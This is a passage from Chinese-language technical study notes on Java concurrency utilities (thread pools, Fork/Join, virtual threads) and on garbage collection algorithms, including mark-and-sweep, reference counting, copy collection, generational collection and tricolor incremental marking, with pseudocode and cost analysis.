class="keyword">static</span> <span class="type">int</span> <span class="variable">maximumPoolSize</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="comment">// 空闲线程存活时间</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">keepAliveTime</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line"><span class="comment">// 空闲线程存活时间 单位</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TimeUnit</span> <span class="variable">unit</span> <span class="operator">=</span> TimeUnit.MILLISECONDS;</span><br><span class="line"><span class="comment">// 创建线程的工厂类,自定义线程名称</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> <span class="string">&quot;thread-local-pool-%d&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ThreadFactory</span> <span class="variable">namedThreadFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadFactoryBuilder</span>().setNameFormat(threadName).build();</span><br><span class="line"><span class="comment">// 存放提交但未执行任务的队列</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> BlockingQueue&lt;Runnable&gt; threadFactory = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 等待队列满后的拒绝策略</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">RejectedExecutionHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.AbortPolicy();</span><br><span class="line"><span class="comment">// 定义线程池</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ExecutorService</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, threadFactory, namedThreadFactory, handler);</span><br></pre></td></tr></table></figure><h4 id="B-Implementation-ForkJoinTask"><a href="#B-Implementation-ForkJoinTask" class="headerlink" title="B. Implementation: ForkJoinTask"></a>B. Implementation: <code>ForkJoinTask</code></h4><p>而 Fork/Join 框架是针对 <code>ExecutorService</code> 接口的实现。它可以充分利用多处理器的优势，为那些可以拆成小块递归的任务设计，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (my portion of the work is small enough) </span><br><span class="line">    do the work directly </span><br><span class="line">else </span><br><span class="line">    split my work into two pieces </span><br><span class="line">    invoke the two pieces and wait for the results </span><br></pre></td></tr></table></figure><p>在 <code>ForkJoinTask</code> 子类（<code>RecursiveTask</code> 有返回值、<code>RecursiveAction</code> 无返回值）中定义这些任务。</p><h3 id="7-8-3-Other-Utilities"><a href="#7-8-3-Other-Utilities" class="headerlink" title="7.8.3 Other Utilities"></a>7.8.3 Other Utilities</h3><h4 id="Concurrent-Collections"><a href="#Concurrent-Collections" class="headerlink" title="Concurrent Collections"></a>Concurrent Collections</h4><p>Concurrent Collections：更容易地管理大规模数据，减少 <code>synchronization</code> 次数；</p><h4 id="Atomic-Variables"><a href="#Atomic-Variables" class="headerlink" title="Atomic Variables"></a>Atomic Variables</h4><p>Atomic Variables：针对变量粒度的同步机制，可以在一定程度上避免 data inconsistency；</p><p>All classes have get and set methods that work like reads and writes on volatile variables</p><h4 id="Virtual-Threads"><a href="#Virtual-Threads" class="headerlink" title="Virtual Threads"></a>Virtual Threads</h4><p>Java 中是一类轻量级线程解决方案。让线程创建、调度、管理的开销最小化。</p><p>Virtual Threads 是 Java Thread 的实例，这与任何 OS thread 是相互独立的。</p><p>当 virtual threads 内部调用了阻塞的 I/O 操作后，会立即被 JVM 挂起；</p><p>virtual threads 有一个有限的 call stack，并且只能执行一个 HTTP client 请求 / JDBC 查询。这对一些异步的耗时任务比较合适，但是不适合 CPU intensive tasks；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">virtualThread</span> <span class="operator">=</span> Thread.ofVirtual().start(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// Code to be executed by the virtual thread</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以 Virtual Threads 不是说会比普通线程更快，而是说比普通线程更具可扩展性（provide scale），这在高并发、每次请求处理耗时的服务器网络应用中能提升吞吐量。</p><p><code>ThreadLocalRandom</code>：为多线程提供高效的伪随机数生成方案；</p><h1 id="Chapter-8-Java-Garbage-Collection"><a href="#Chapter-8-Java-Garbage-Collection" class="headerlink" title="Chapter 8. Java Garbage Collection"></a>Chapter 8. Java Garbage Collection</h1><p>本章，我们将先从 “为什么需要垃圾回收”、“垃圾回收的思路是什么”（8.1）出发，先介绍现存的主流语言（Python/JavaScript 等）甚至操作系统（Android）究竟采用了哪些垃圾回收方式（8.2 ~ 8.7），然后再来看看 Java 语言自己是怎么做垃圾回收的（8.8 ~ 8.9）。</p><h2 id="8-1-Problem-Definition"><a href="#8-1-Problem-Definition" class="headerlink" title="8.1 Problem Definition"></a>8.1 Problem Definition</h2><h3 id="8-1-1-Why-amp-How"><a href="#8-1-1-Why-amp-How" class="headerlink" title="8.1.1 Why &amp; How"></a>8.1.1 Why &amp; How</h3><p>通常情况下，无论是什么语言，在运行时想要分配空间，要么放在栈上、要么放在堆上。</p><p>栈上分配的变量全权由编译器管理（如果你写过编译器，请回想一下令人讨厌的 global frame size），这也是绝大多数语言的（解释型语言则是解释器）共性；</p><p>但是部分语言的有一部分空间是分配在堆上的。例如 tiger 语言中，我们初始化数组/结构体，它调用的 runtime function 底层由 C++ 实现，最终就是分配在堆上的。</p><p>如果这类使用堆空间的语言，在运行时不及时释放堆空间，可能会导致堆溢出的问题。由于像 tiger 这样的语言不涉及底层的结构（包括 Python、Java 等等），没有指针的概念，自然也没办法自己释放，或者这种语言的定位就是不需要开发者来释放（所谓 “内存安全”），那么还需要借助<strong><u>运行时机制</u></strong>来管理堆空间。</p><p>垃圾回收的基本原理就是，当一个被分配的地址没办法被当前的任何指针/变量访问到（not reachable），那么就需要运行时工具帮助释放这片空间，使得它能够被重新分配和使用。</p><blockquote><p>更准确一点，其实应该进行 liveness analysis（就像前面设计编译器时做的），但是运行时显然不方便做这种静态分析（运行时难以看出）。因此人们通常使用可达性（reachability）来代替 liveness 进行分析，只不过 reachability 可能没有 liveness 那么及时 / 精确（还可能出现一些问题，后面讨论）。</p><p>也就是说，如果存活，一定可达（这是由各个语言的编译器保证的）。</p></blockquote><p>于是，垃圾回收的过程就是，从当前已知存活的变量开始（例如当前栈帧上、寄存器中正在使用的变量），递归地去搜索可达的内存区域，再把分配过、但不可达的内存释放即可。</p><blockquote><p>我们通常使用有向图去描述 “两个存活变量间的可达关系”：结点表示程序当前栈上/寄存器中正在使用的变量 和 堆上分配的记录，边表示地址指针；</p></blockquote><p>所以，<strong>几乎所有自动 GC 都遵循一个理念：按照某个策略<u>预定的时间</u>（定时策略），释放<u>不再继续使用的</u>（标记策略）<u>引用类型变量</u>所占用的空间</strong>；</p><blockquote><p>为什么加上了 “定时”：运行时是动态的，总不能只回收一次，或者一直回收；</p></blockquote><h3 id="8-1-2-GC-Metrics"><a href="#8-1-2-GC-Metrics" class="headerlink" title="8.1.2 GC Metrics"></a>8.1.2 GC Metrics</h3><p>另外还有一点需要注意的是，GC 通常会伴随一段时间的 STW（stop-the-world，时停），此时段间，无论这个语言是单线程还是多线程的，都需要全部暂停等待 GC 的处理。</p><p>这样的 STW 在大多数 GC 算法中都是必要的，不过有长有短（取决于具体算法）。这主要是因为 GC 在运行时总有一些数据需要确保 synchronization，防止并发的回收造成数据不安全的问题。我将 STW 的时长称为 <strong>GC 算法的时延（GC latency）</strong>；</p><p>还有一点需要明确的是，我们引入 GC 是为了防止内存泄漏。而 “内存泄漏” 这个概念本身<strong><u>并不是</u></strong>说没有回收完所有的不再使用的空间就是泄漏了，而是<strong><u>没有及时的回收不再使用的堆空间，引发的一系列问题，包括堆溢出</u></strong>。</p><p>所以重点在于 “及时” 而不是 “全部”。也就是说，一个 GC 算法可以不需要在一次回收过程清理掉全部的垃圾，而是只需要确保及时就行。</p><p>于是我们还可以定义 <strong>GC throughput</strong>，即一次 GC 操作中，单位时间内回收记录的数量，这个指标能间接反映这个 GC 算法的效率，以及它究竟是否 “及时”。</p><h2 id="8-2-Mark-amp-Swap"><a href="#8-2-Mark-amp-Swap" class="headerlink" title="8.2 Mark &amp; Swap"></a>8.2 Mark &amp; Swap</h2><p>一种 GC 策略是 “标记清除”（Mark-And-Swap，标记策略）+ 溢出清理（定时策略）：</p><ul><li><p>Mark：从可达有向图的根结点（已知存活的变量）开始遍历，将遇到的所有结点全部标记一遍；</p></li><li><p>Swap：将整个堆扫描一遍，把没有标记的结点放到 free list 中（相当于释放），并且清空所有标记（为下一轮 GC 准备）；</p></li><li>程序在 GC 开始时 freeze，在 GC 结束时 resume，从 free list 中分配堆空间；</li><li>程序只有在 free list 为空时才进行 GC；</li></ul><blockquote><p>目前正在使用这个策略的语言有 JavaScript；</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Mark phase:</span><br><span class="line">    for each root v</span><br><span class="line">        DFS(v)</span><br><span class="line"></span><br><span class="line">Sweep phase:</span><br><span class="line">    p &lt;- first address in heap</span><br><span class="line">    while p &lt; last address in heap</span><br><span class="line">        if record p is marked</span><br><span class="line">            unmark p</span><br><span class="line">        else let f1 be the first field in p</span><br><span class="line">            p.f1 &lt;- freelist</span><br><span class="line">            freelist &lt;- p</span><br><span class="line">        p &lt;- p + (size of record p)</span><br><span class="line"></span><br><span class="line">function DFS(x)</span><br><span class="line">    if x is a pointer and points to record y</span><br><span class="line">        if record y is not marked</span><br><span class="line">            mark y</span><br><span class="line">        for each field fi of record y</span><br><span class="line">            DFS(y.fi)</span><br></pre></td></tr></table></figure><p>这样做的优缺点：</p><ul><li><p>优点：算法简单便于实现，很多情况下确实是有效的（满了就回收全部的垃圾）；</p></li><li><p>缺点：性能不佳（扫描全堆，throughput 不大），而且需要经常打断程序执行流先做垃圾回收，程序效率不佳（总体 STW 很长）。</p></li></ul><p>分析一下：</p><p>$T=c_1R+c_2H$（$R$ 为可达变量数、$H$ 为堆大小），每次增长 free list entry 数量 $H-R$，因此总体均摊时间：$\overline{T}=\dfrac{c_1R+c_2H}{H-R}$；</p><p>于是我们知道：当 $H$ 和 $R$ 很接近的时候，GC 的性能会很差。因此我们的改进是，在 $\dfrac{R}{H}\gt0.5$ 的时候建议 OS 增大当前进程的堆的大小；</p><p><u>第二个改进</u>，是考虑到如果只使用 DFS 函数调用递归很可能导致栈溢出（因为堆本身是很大的），考虑引入 显式的栈来实现 DFS；</p><blockquote><p>更有技巧一点的话，还有 pointer reversal 这类优化的方法。但是本文的主题不是讨论这些算法，因此略过，感兴趣的读者可以自行搜索。</p></blockquote><p><u>第三个改进</u>，对于 free list，我们可以模仿 Memory Allocation 的 aggregation list，管理多个 free list 并按照列表的大小来分类；</p><h2 id="8-3-Reference-Count"><a href="#8-3-Reference-Count" class="headerlink" title="8.3 Reference Count"></a>8.3 Reference Count</h2><p>还有一类常见的 GC 策略是 “引用计数”（标记策略）+ 分配时清理（定时策略）；</p><blockquote><p>目前使用这种 GC 策略的语言有 Python、Swift 等等；</p></blockquote><p>这里我们对每一个在堆上的 record 维护一个额外的字段（<code>ref_cnt</code>）表明当前有多少变量指向它。</p><p>然后在赋值、作用域变化等等情况时更新变量对应的值就行。</p><blockquote><p>举个例子，例如 record <code>x</code> 的某个 field <code>x.fi</code> 原本是 <code>z</code>（是堆上的 record）赋值为 <code>y</code>（另一个堆上的 record）此时：</p><ul><li>读写 <code>y</code> 的 reference count 使其增加；</li><li>读写 <code>z</code> 的 reference count 使其减少；</li><li>检查 <code>z</code> 的 reference count 如果是 0，则将 <code>z</code> 加入 freelist；</li><li>而 <code>z</code> 中的字段（例如 <code>z.fi</code>）如果是堆上的指针，则<u>推迟到 <code>z</code> 所在的地址被从 free list 分配出去时再减小 reference count</u>；</li></ul></blockquote><p>于是相较于同步的 Mark-and-Swap，引用计数的好处是：</p><ul><li>避免了批量、递归的检查回收操作，将部分的更新引用计数操作推迟到分配时（批处理提升了 GC throughput）；</li><li>不需要频繁进行全堆扫描，提升了程序执行效率（压缩了 STW 的时长）；</li></ul><p>只不过引用计数还引入了一些问题：</p><ul><li><p>循环引用：相互引用的变量无法让 <code>ref_cnt</code> 减为 0（信息不充分会导致回收不充分）；</p><blockquote><p>解决方法 1：引入语义层面的语法特性，例如<strong><u>弱引用</u>（Weak References）</strong>，当内存压力比较大的时候，将这种弱引用视为没有引用。</p><p>但是这相当于把难题丢给了开发者，容易导致程序运行时错误的出现（例如使用一个被释放了的弱引用变量）；</p><p>解决方法 2：进行简单的 cycle detection，对某些容易成环的地方进行特殊检查，及时除环；</p><p>解决方法 3：与 mark &amp; swap 结合（occasional），补上全局信息，但 mark 操作很昂贵；</p></blockquote></li><li><p>内存访问性能问题：例如 <code>x.fi &lt;- p</code> 这个语句在加上引用计数的 GC 后，会变成 3 次内存访问，性能可能更差些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">z &lt;- x.fi</span><br><span class="line">c &lt;- z.count</span><br><span class="line">c &lt;- c – 1</span><br><span class="line">z.count &lt;- c</span><br><span class="line">if c = 0 call putOnFreelist</span><br><span class="line">x.fi &lt;- p</span><br><span class="line">c &lt;- p.count</span><br><span class="line">c &lt;- c + 1</span><br><span class="line">p.count &lt;- c</span><br></pre></td></tr></table></figure></li></ul><p>正因为这两个问题，我们常常在一些 GC 学术原型中才能见到它，实际使用这种方法会出现一些难以避免的性能问题。但是不可否认的是，这种方法（思路）真的很简单和显然，所以它也被常常应用到其他的领域和方面。例如 file table 维护文件打开状态时使用、虚拟页和物理页的映射时物理页维护引用计数、C++ 的智能指针 <code>shared_ptr</code> 等等。</p><h2 id="8-4-Copy-Collection"><a href="#8-4-Copy-Collection" class="headerlink" title="8.4 Copy Collection"></a>8.4 Copy Collection</h2><p>这类 GC 策略比较新，有些现代的应用（例如 Android 10+）就在使用这种 GC 策略。内容如下：</p><ul><li><p>将 heap 拆成两个部分：from-space &amp; to-space；</p><p>from-space 专门存放分配的内容，to-space 专门管理回收的内容；</p></li><li><p>两个 space 都有一个 <code>limit</code> 指针表示该区域结尾；</p></li><li><p><code>next</code> 表示该区域接下来要插入的位置，分配内存就是向 <code>next</code> 后面追加可达的 entry；</p></li><li><p>如果 <code>next</code> 到 <code>limit</code> 的位置，证明当前的 semi-space 满了，我们从 <code>root</code> 根结点（目前肯定存活的）开始，将所有可达结点 copy 到另一个 semi-space 中（<code>next</code> 也移过去了），相当于丢弃了不可达结点、变相进行了一次 GC；</p></li></ul><p>这样做有几点好处：</p><ul><li>不需要特地进行 mark + sweep 了，操作更简单，降低了时间复杂度，一次 copy 足矣（进一步降低 STW 长度）；</li><li>每次 copy 都相当于整理出了连续的空闲堆空间，方便分配、减小了 external fragments，最大化 memory utilization；</li></ul><p>相比于 mark-and-sweep 也有坏处：</p><ul><li>如果大部分变量存活时间很长（$R\sim H$），会导致内存拷贝过多，overhead 很大；</li><li>一半的空间利用率低下；</li></ul><p>实现 Copy Collection 的算法是 Cheney’s algorithm：</p><p><img src="imgs/gc-cc-cheney-algo.png" width="400px" /></p><blockquote><p>解释一下算法：</p><p>把当前准备切走的一边称为 from-space，另一边称为 to-space；</p><p>每个被分配的 entry（$p$）的第一个字段（$f_1$）保存<u>指向当前分配对象自己</u>的指针（只有在移动更新时指向新的对应的 entry），其他字段（$f_i$）存放正常被分配的数据；</p><p><code>Forward(p)</code> 函数的含义是将 <code>p</code> 指针对应的结点数据完全移动到 to-space（如果已经完成移动则什么也不做）；</p><p>主函数的算法就是从根结点开始（先 forward 根结点）BFS 遍历结点、更新 <code>scan</code>，遍历到的直接调用 <code>Forward</code> 转移。同时需要更新拿在手上的指针，保证上层应用无感；</p></blockquote><p>这种算法有些优缺点：</p><ul><li>优点：不引入额外数据结构（没有额外的栈、不需要 reversal pointers）；</li><li>缺点：影响原来程序的 locality！无法充分利用局部性（不相干的 record 可能被复制到一起），这会降低每次 GC 后的程序执行效率；</li></ul><p>因此我们作出优化：<strong><u>Semi-depth-first Algorithm</u></strong>，这也是 Copy Collection 最常见的实现方法：</p><p><img src="imgs/gc-semi-df.png" width="700px"/></p><p>这个算法的思路是 DFS，所以主函数省略了（就是对每个 root 结点调用 <code>Forward</code> 然后结束）。这个 <code>Forward</code> 函数我们在 Cheney’s Algorithm 中见过类似的结构，就是如果当前 entry（由 <code>p</code> 指向）完全移到 to-space（第一字段已经在 to-space 了），那么就直接返回，否则调用 <code>chase</code> 迁移；</p><p>主要看 <code>Chase(p)</code> 的做法。<code>q</code> 和 <code>next</code> 有点像算法里的左右指针，<code>q</code> 表示当前正在迁移的 entry 的开头，<code>next</code> 则表示正在迁移的 entry 的结尾；</p><p>而 <code>r</code> 和 <code>p</code> 又像一对前后指针，<code>p</code> 表示当前正在 copy 的节点，<code>r</code> 则是一轮 semi-DFS 从根到叶遍历的指针；</p><p>中间 <code>for</code> 循环的作用是把要 copy 的 <code>p</code> 指向的 entry 的每个字段都复制到 to-space 中。同时 <code>Chase</code> 还需要考虑 <code>p</code> entry 中指向 from-space（分配在堆上但没迁移的 entry）的指针。</p><blockquote><p>为什么 <code>Chase</code> 需要考虑 <code>p</code> 中的指向 from-space 的指针？因为这里是 DFS，不能直接结束对 <code>p</code> 的迁移，否则就变成 BFS 了（Cheney’s Algorithm）；应该像这样一直沿树边递归到底；</p></blockquote><p>一轮 semi-DFS 后，如果 <code>p</code> 有多个 field 都指向堆，那么默认是先 copy 当前 <code>p</code> entry 中的最后一个 from-space 分配的地址，方便 <code>repeat</code> 循环递归（DFS）地移动 from-space 中分配的 entries；</p><blockquote><p>为啥是 copy 最后一个？因为递归过程一次只能保存一个，这也是算法称为 “semi-DFS” 的原因（没有完全遵循 DFS 的遍历方法）。更清楚一点，我们可以看下面的比较图（注意到 4、6 是最后才访问的）：</p><p><img src="imgs/gc-semi-dfs.png" width="350px" /></p><p>例如 <code>1 -&gt; 2 -&gt; 5</code> 后，一轮 semi-DFS 结束，虽然看到了 <code>4</code> 对应的 record，但也只是更新了 <code>2</code> 的 record 的指针，并没有 copy <code>4</code> 的 record 到 to-space；随后递归回溯到 <code>1</code> 再继续；</p></blockquote><h3 id="Optimizations"><a href="#Optimizations" class="headerlink" title="Optimizations?"></a>Optimizations?</h3><p>注意到，copy collection 对于堆空间的浪费还是很严重的，因为每次只使用一半的堆空间（另一边必须是无效的）。于是一个很简单的优化是，底层使用 <code>mmap</code> 来处理对堆空间的分配。我们可以让另一半（不在使用的 to-space）在 copy 前是 unmap 的状态（未分配物理页），这样能更充分地利用机器资源。</p><blockquote><p>但这么做也有点问题，在 GC collector 进行 copy collection 的途中可能出现物理内存猛增的情况；</p><p>但这确实能缓解在除了 GC 阶段以外的其他时间里内存不够用的情况。</p></blockquote><p>注意到 Copy Collection 的均摊开销主要在 $\dfrac{c_3R}{\dfrac{H}{2}-R}$ 左右（$c_3\sim10$，$R$ 为存活记录的大小）；那么我们如何降低上述内存使用，并且继续提升整体 GC 性能呢？</p><h2 id="8-5-General-Collection-Generations"><a href="#8-5-General-Collection-Generations" class="headerlink" title="8.5 General Collection (Generations)"></a>8.5 General Collection (Generations)</h2><h3 id="8-5-1-Design"><a href="#8-5-1-Design" class="headerlink" title="8.5.1 Design"></a>8.5.1 Design</h3><p>一般情况下，GC 的 throughput 和 latency 是相互制约的，例如我想要确保 throughput 很大，一般需要扫描更多的信息来进行批处理，但扫描更多的信息会导致 latency 的延长。</p><p>但是这种 GC 的策略相较于前面几种方法，可以同时提升 throughput、降低 latency。主要是人们有以下的特性的观察（不是准确和普适的定律，而是经验假设）：</p><ul><li>堆上新创建的对象通常更容易先死去；</li><li>堆上存活的时间越长的对象通常更不容易死去；</li></ul><blockquote><p>堆上存活时间长的越长，短的越可能更短。也许可以用马太效应解释；</p></blockquote><p>基于这个特性，人们提出了 general collection 的 GC 策略（分代）：</p><ul><li><p>将 heap 分为若干区域 $G_0,\space G_1,\space G_2,\ldots$，编号从小到大存放的是创建对象的由新到旧（新生代 ~ 持久代）。被分配的对象首先被放入 $G_0$；</p></li><li><p>$G_0,G_1,\ldots$  这些代（generations）一般使用 Marking 的思路（给数据标记）；</p></li><li><p>GC collector 重点回收 $G_0$ 区域的对象。同时需要关注 $G_1,G_2,\ldots$ 中指向 $G_0$ 区域的指针（如果存在，$G_0$ 的这个区域就不能释放）；</p><blockquote><p>其实 $G_1,G_2,\ldots$ 中有指向 $G_0$ 区域的指针 这件事本身就很罕见。主要是因为根据经验假设，$G_0$ 只有很少一部分新生对象会进入 $G_1$ 以及更旧的代（10%-20%），而 $G_1$ 中的指针更普遍的是指向自己代或者更旧的代（因为先定义再使用嘛），更少有指向新一代的指针。</p><p>相反的情况，如果 $G_0$ 中的数据有些指向 $G_1,G_2,\ldots$ 区域的指针，那么它们可以立即被释放；</p></blockquote></li><li><p>每次 $G_0$ 未能清空 N 次（N 一般是 2~3 左右，应该看不同应用场景）的部分会转移到 $G_1$，并且更旧的代同理，依次进行；也正因如此，$G_0,G_1,\ldots$ 各代间的大小差距最好是指数级的；</p></li></ul><p>这样做带来的好处是，每次回收只需要扫描原先 20% 左右的区域，但是能回收率能达到 80%，不仅减小了 latency（扫描的区域少了），而且增大了 throughput（单位时间回收的量增多了），极大提升 GC 效率。</p><p>这种策略的均摊时间开销：$\dfrac{c_3R}{H-R}$（和 Copy Collection 相比，$\dfrac{H}{2}$ 变为 $H$）；并且通常情况下，由于 $G_0$ 本身不大，因此很多情况都有 $H\gt10R$，也就是说一般情况的均摊复杂度 $\dfrac{1}{9}c_3$（相对于前面的策略效率提升了 10 倍，如果只考虑 $G_0$ 的话）！</p><p>可是，如果涉及更旧代的回收，时间开销还是很大的（例如如果只有两代，并且做一次 $G_0,G_1$ 回收，就相当于扫描了整个堆）。不过好在需要回收旧代的频率并不是很高。</p><h3 id="8-5-2-Patch-Ways-of-Remembering"><a href="#8-5-2-Patch-Ways-of-Remembering" class="headerlink" title="8.5.2 Patch: Ways of Remembering"></a>8.5.2 Patch: Ways of Remembering</h3><p>现在回过头看一下，如果使用 general collection，有个问题是我们 “同时需要关注 $G_1,G_2,\ldots$ 中指向 $G_0$ 区域的指针”。</p><p>虽然就像前面说的，这种情况很罕见，但还是需要考虑的，例如堆上分配的结构体在它被分配的很久以后突然更新了一个字段，这种情况就可能出现上述罕见的现象。于是我们<u>需要单独保存一些旧代中有指针指向新代的信息</u>（不然 GC collector 很难判断 $G_0$ 中会不会出现上述罕见情况，而且全表扫描太慢了）。</p><p>为了解决这个问题，人们首先想出了借助一个 Remembered List 的方法：每次更新被分配 entry 的某个字段时，向这个 list 中加入一条更新的记录。这种方法有个问题，就是实际上可用的堆的空间一般很大，平均需要记录的更新数据可能会达到数个 MB，这对于一个内存中的列表而言开销已经比较大了。</p><p>于是人们想使用 Remembered Set 来存放，因为它的去重性质，我们可以在分配的 object $b$ 中使用 1 个 bit 来记录它是否已在 remembered set 中；</p><p>以上两种方法的粒度都是对象（很细），免不了占用比较大的内存资源。</p><p>于是人们提出了粗粒度的信息存放方案（<strong><u>Card Marking</u></strong>，比较主流的实现方案）：</p><ul><li>将内存分为 $2^k$ bytes 大小的内存区域，称为 logical cards（逻辑卡片）；</li><li>一个对象可以占据一个卡片的一部分，或者从卡片中间区域开始占据到后面的卡片；</li><li>当 $b$ 地址在分配后被更新时，包含这个地址的卡片会被标记；</li><li>可以用更小的 list（byte index 向右移动了 $k$ 位）来保存 mark 的情况；</li></ul><p>具体实现就是在每次更新 object 时打桩（在 <code>obj.f = a</code> 的后面加上代码，判断如果确实是 <code>G1</code> 指向 <code>G0</code> 的情况，则从 card 对应的 list 中取出并更新）；</p><p>坏处：不清楚在这片区域的 cross generation pointer 具体在哪里，还需要在这片区域内继续查找（空间换时间）；</p><p>另一种方法是用 Page 的粒度来管理这个信息（<strong>Page Marking</strong>）：</p><ul><li>就像 card marking，不过 $2^k$ 是页表大小；</li><li>更新一个分配的 object 相当于 makes the page dirty；</li><li>用户态程序可以在每次 GC 后标记 write-protected；</li></ul><p>这样相当于把 card marking 的打桩操作变成了用户态的 fault handler。但实际上开销也不小（毕竟需要进出内核以及用户态 handler）；</p><h2 id="8-6-Incremental-Collection"><a href="#8-6-Incremental-Collection" class="headerlink" title="8.6 Incremental Collection"></a>8.6 Incremental Collection</h2><p>这里还有个更加复杂的回收策略，和实际应用结合得比较紧密。</p><p>这个策略着重关注于优化 STW 时长（latency）这个指标，希望 GC 让应用停止的时间尽可能短（尤其是在涉及 UI 前台类型/端侧的语言中，不希望用户感受到卡顿）；</p><p>比如对于数十 GB 的内存而言，同步的 Mark &amp; Swap 的 STW 可能在百毫秒级别，这对后台程序 / 服务器应用而言不那么关心，但是如果是端侧设备 / 浏览器 / 游戏设备 / 精确的嵌入式设备呢？这个问题就很突出了。</p><p>这个时候，两种思路：</p><ul><li>让 GC 回收程序和应用并发执行（从根本上极大缩短甚至基本消灭 STW）；</li><li>让 GC 回收程序按应用执行的情况增量地回收（通过减少需要扫描的数据量，也能极大缩短 STW）；</li></ul><p>这时我们需要引入一些概念：</p><ul><li><p>Collector：专门收集不再使用的分配的空间并释放；</p></li><li><p>Mutator：改变 reachable data 的关联图；</p><blockquote><p>将应用中改变 reachable 关系的逻辑抽象出来，它就是之前阻碍 GC collector 并发，也是 STW 出现的主要原因；</p></blockquote></li><li><p>Incremental Collection：只有 Mutator 需要 Collector 回收时才进行回收（调用式关系）；</p></li><li><p>Concurrent Collection：在 Mutator 执行期间 Collector 并发执行（后台服务关系）；</p></li></ul><p>现在介绍一种 Incremental Collection 的实现模型：<strong><u>Tricolor Marking</u>（三色标记模型）</strong>；</p><p>任意一个被分配的记录只会处于 3 种颜色中：</p><ul><li>White: not visited by GC；</li><li>Grey: visited by GC, but its children are not；</li><li>Black: visited by GC, so as its children；</li></ul><p>算法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procedure tricolor-marking:</span><br><span class="line">set root object gray // visit</span><br><span class="line"></span><br><span class="line">while they are any gray objects:</span><br><span class="line">    select a gray record p</span><br><span class="line">    for each field fi of p:</span><br><span class="line">        if fi.p is white:</span><br><span class="line">            color fi.p gray// visit first time (可以用栈压入来实现)</span><br><span class="line">    color record p black// visit second time (可以用栈弹出来实现)</span><br></pre></td></tr></table></figure><blockquote><p>这里是 BFS 性质的遍历所以使用栈数据结构。可以类比，Copy Collection 中的 Cheney’s Algorithm，可以使用队列数据结构来实现；</p></blockquote><p>这里注意几个<strong><u>算法不变量</u>（Invariants）</strong>，它们是构建 Incremental Collection 的根本原理：</p><ul><li>不存在黑结点直接指向白结点的情况。如果有就说明黑色结点对应的对象并没有处理完全，出现了数据不一致的问题；</li><li>灰结点一定在 collector 的数据结构（fringe）中，意味着正在处理；</li></ul><p>现在，我们希望在 tricolor marking 的基础上引入 incremental collection，就意味着，被分配的 object 在 GC 结束后继续留有标记，交给 mutator 执行。</p><p>过一段时间后，再次进入 GC 执行算法时，可能就会出现上述算法不变量的违反。</p><p>例如，已经染黑的结点（GC 完全扫描的结点）在上一轮 GC 结束后，被 mutator 追加了白色结点（上一轮 GC 结束后才分配的），这个时候就违反了第一个 invariant。</p><p>于是！所谓的 incremental collection 做增量回收，就是通过在 runtime 分配堆空间时，采取措施保证 invariants 的成立（在 mutator 运行时，而非 collector 运行时），对变化的部分进行 GC 检查。</p><p>基本的思路还是，针对基本的读写操作进行打桩（barriers）：</p><ul><li><p>Method 1 (Dijkstra, Lamport)：向黑结点 object 写入指针 field （插入白结点）时染灰（纳入 GC 管理中）；</p></li><li><p>Method 2 (Steele)：向黑结点 object 写入指针 field （插入白结点）时将父黑结点染灰（dirty，让之前的结点重新放入 GC fringe、表示需要重新扫描）；</p><p>(Boehm, Demers, Shenker) 改进是把 black 结点的页改成 write-protected，page fault handler 更改权限为 writable，并且标记为灰色（但这么做也有性能问题）；</p></li><li><p>Method 3 (Baker)：在读<u>灰结点</u> object 的白子结点时提前将该白结点染灰（纳入 GC 管理），这样 mutator 永远无法获得一个不受 GC 管理的指针了！因此就不会出现 invariant 的违反问题；</p><p>(Appel, Ellis, Li) 改进还是利用 page fault，但这个时候直接从灰结点开始进行一次 